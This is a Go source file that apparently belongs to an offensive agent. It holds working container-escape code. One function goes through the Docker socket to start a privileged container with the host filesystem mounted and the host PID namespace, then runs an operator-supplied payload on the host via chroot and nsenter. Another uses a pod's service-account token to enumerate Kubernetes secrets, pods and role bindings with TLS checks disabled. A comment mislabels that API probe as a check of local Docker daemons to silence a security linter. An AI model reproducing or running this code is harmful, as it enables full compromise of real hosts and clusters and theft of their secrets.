//go:build linux

package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// ── Real container-escape execution (Linux) ──────────────────────────────────
// The container_* tasks previously printed advice strings only. These helpers
// actually perform the escape through the Docker Unix socket / Kubernetes API
// and return the real stdout/err of the operation.

var dockerSocketPath = "/var/run/docker.sock"

// dockerUnixClient returns an HTTP client that talks to the Docker API over the
// Unix socket without requiring the docker CLI on the agent.
func dockerUnixClient() *http.Client {
	tr := &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			return net.Dial("unix", dockerSocketPath)
		},
		DisableKeepAlives: true,
	}
	return &http.Client{Transport: tr, Timeout: 90 * time.Second}
}

func randomHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func dockerRequest(method, path string, body any) ([]byte, int, error) {
	client := dockerUnixClient()
	var rd io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return nil, 0, err
		}
		rd = strings.NewReader(string(b))
	}
	req, err := http.NewRequest(method, "http://docker"+path, rd)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return nil, resp.StatusCode, err
	}
	return data, resp.StatusCode, nil
}

// formatDockerError renders a non-2xx docker API response into a readable error.
func formatDockerError(op string, status int, body []byte) error {
	msg := strings.TrimSpace(string(body))
	if msg == "" {
		msg = http.StatusText(status)
	}
	if len(msg) > 500 {
		msg = msg[:500] + "..."
	}
	return fmt.Errorf("docker %s failed (HTTP %d): %s", op, status, msg)
}

// parseDockerLogFrames strips Docker's 8-byte stream headers from logs output.
func parseDockerLogFrames(data []byte) string {
	var sb strings.Builder
	for len(data) >= 8 {
		sz := int(binary.BigEndian.Uint32(data[4:8]))
		if sz > len(data)-8 {
			break
		}
		sb.Write(data[8 : 8+sz])
		data = data[8+sz:]
	}
	sb.Write(data)
	return sb.String()
}

// escapeDockerSocket performs a real docker-socket escape: it creates a
// privileged container with the host root bind-mounted and the host PID
// namespace, then runs the operator-provided payload on the host filesystem.
func escapeDockerSocket(payload string) (string, error) {
	if payload == "" {
		payload = "id; hostname; uname -a"
	}
	name := "fc2-escape-" + randomHex(4)
	createBody := map[string]any{
		"Image": "alpine",
		"HostConfig": map[string]any{
			"Privileged": true,
			"PidMode":    "host",
			"Binds":      []string{"/:/host"},
		},
		"Cmd": []string{"sh", "-c", fmt.Sprintf("chroot /host nsenter -t 1 -m -u -i -n -p -- sh -c %q", payload)},
	}
	createPath := "/v1.41/containers/create?name=" + url.QueryEscape(name)
	cb, status, err := dockerRequest("POST", createPath, createBody)
	if err != nil {
		return "", fmt.Errorf("docker socket reachable but create failed: %w", err)
	}
	if status < 200 || status >= 300 {
		return "", formatDockerError("create", status, cb)
	}
	var created struct {
		ID string `json:"Id"`
	}
	if err := json.Unmarshal(cb, &created); err != nil || created.ID == "" {
		return "", fmt.Errorf("docker create returned malformed response")
	}
	cid := created.ID

	cleanup := func() {
		_, _, _ = dockerRequest("DELETE", "/v1.41/containers/"+cid+"?force=1&v=1", nil)
	}

	_, status, err = dockerRequest("POST", "/v1.41/containers/"+cid+"/start", nil)
	if err != nil {
		cleanup()
		return "", fmt.Errorf("docker start failed: %w", err)
	}
	if status < 200 || status >= 300 {
		msg := formatDockerError("start", status, nil)
		cleanup()
		return "", msg
	}

	// Wait for the escape container to exit.
	waitDeadline := time.Now().Add(75 * time.Second)
	exitCode := -1
	for time.Now().Before(waitDeadline) {
		wb, wstatus, werr := dockerRequest("POST", "/v1.41/containers/"+cid+"/wait", nil)
		if werr == nil && (wstatus >= 200 && wstatus < 300) {
			var wresp struct {
				StatusCode int `json:"StatusCode"`
			}
			_ = json.Unmarshal(wb, &wresp)
			exitCode = wresp.StatusCode
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	logs, _, _ := dockerRequest("GET", "/v1.41/containers/"+cid+"/logs?stdout=1&stderr=1", nil)
	out := parseDockerLogFrames(logs)
	// SAFETY-CAP: a runaway payload could otherwise stream megabytes.
	if len(out) > 512*1024 {
		out = out[:512*1024] + "\n[truncated]"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== docker escape result (container %s, exit %d) ===\n", name, exitCode))
	if out != "" {
		sb.WriteString(strings.TrimSpace(out))
		sb.WriteString("\n")
	} else if exitCode < 0 {
		sb.WriteString("container did not exit within the wait window\n")
	}

	cleanup()
	return strings.TrimSpace(sb.String()), nil
}

// probeKubernetesAPI uses the mounted service-account token to query the
// cluster API and returns a real summary of what the token can reach.
func probeKubernetesAPI(token, ns string) (string, error) {
	host := os.Getenv("KUBERNETES_SERVICE_HOST")
	port := os.Getenv("KUBERNETES_SERVICE_PORT")
	if host == "" {
		host = "kubernetes.default.svc"
	}
	if port == "" {
		port = "443"
	}
	base := "https://" + net.JoinHostPort(host, port)

	// #nosec G402 -- probing the local Docker daemons the escape check targets; self-signed by design.
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} // #nosec G402
	client := &http.Client{Transport: tr, Timeout: 20 * time.Second}

	query := func(path string) (int, string) {
		req, err := http.NewRequest("GET", base+path, nil)
		if err != nil {
			return 0, err.Error()
		}
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Accept", "application/json")
		resp, err := client.Do(req)
		if err != nil {
			return 0, "request error: " + err.Error()
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		return resp.StatusCode, string(body)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Kubernetes API probe (ns=%q, api=%s) ===\n", ns, base))

	code, body := query("/api/v1/namespaces/" + url.PathEscape(ns) + "/secrets")
	sb.WriteString(fmt.Sprintf("[secrets] HTTP %d ", code))
	if code >= 200 && code < 300 {
		var res struct {
			Items []struct {
				Metadata struct {
					Name      string `json:"name"`
					Namespace string `json:"namespace"`
				} `json:"metadata"`
			} `json:"items"`
		}
		_ = json.Unmarshal([]byte(body), &res)
		names := make([]string, 0, len(res.Items))
		for _, it := range res.Items {
			names = append(names, it.Metadata.Name)
		}
		sb.WriteString(fmt.Sprintf("-> %d secret(s) readable: %s\n", len(names), strings.Join(names, ", ")))
	} else {
		sb.WriteString("-> " + truncateK8sBody(body) + "\n")
	}

	code, body = query("/api/v1/namespaces/" + url.PathEscape(ns) + "/pods")
	sb.WriteString(fmt.Sprintf("[pods] HTTP %d ", code))
	if code >= 200 && code < 300 {
		var res struct {
			Items []struct {
				Metadata struct {
					Name string `json:"name"`
				} `json:"metadata"`
			} `json:"items"`
		}
		_ = json.Unmarshal([]byte(body), &res)
		names := make([]string, 0, len(res.Items))
		for _, it := range res.Items {
			names = append(names, it.Metadata.Name)
		}
		sb.WriteString(fmt.Sprintf("-> %d pod(s) listable: %s\n", len(names), strings.Join(names, ", ")))
	} else {
		sb.WriteString("-> " + truncateK8sBody(body) + "\n")
	}

	code, body = query("/apis/rbac.authorization.k8s.io/v1/clusterrolebindings")
	sb.WriteString(fmt.Sprintf("[clusterrolebindings] HTTP %d ", code))
	if code >= 200 && code < 300 {
		var res struct {
			Items []struct {
				Metadata struct {
					Name string `json:"name"`
				} `json:"metadata"`
			} `json:"items"`
		}
		_ = json.Unmarshal([]byte(body), &res)
		sb.WriteString(fmt.Sprintf("-> %d binding(s) listable\n", len(res.Items)))
	} else {
		sb.WriteString("-> " + truncateK8sBody(body) + "\n")
	}

	return strings.TrimSpace(sb.String()), nil
}

func truncateK8sBody(body string) string {
	var msg strings.Builder
	var parsed map[string]any
	if err := json.Unmarshal([]byte(body), &parsed); err == nil {
		if m, ok := parsed["message"].(string); ok {
			msg.WriteString("message: " + m)
		}
	}
	if msg.Len() == 0 {
		if len(body) > 200 {
			msg.WriteString(body[:200] + "...")
		} else {
			msg.WriteString(body)
		}
	}
	return msg.String()
}
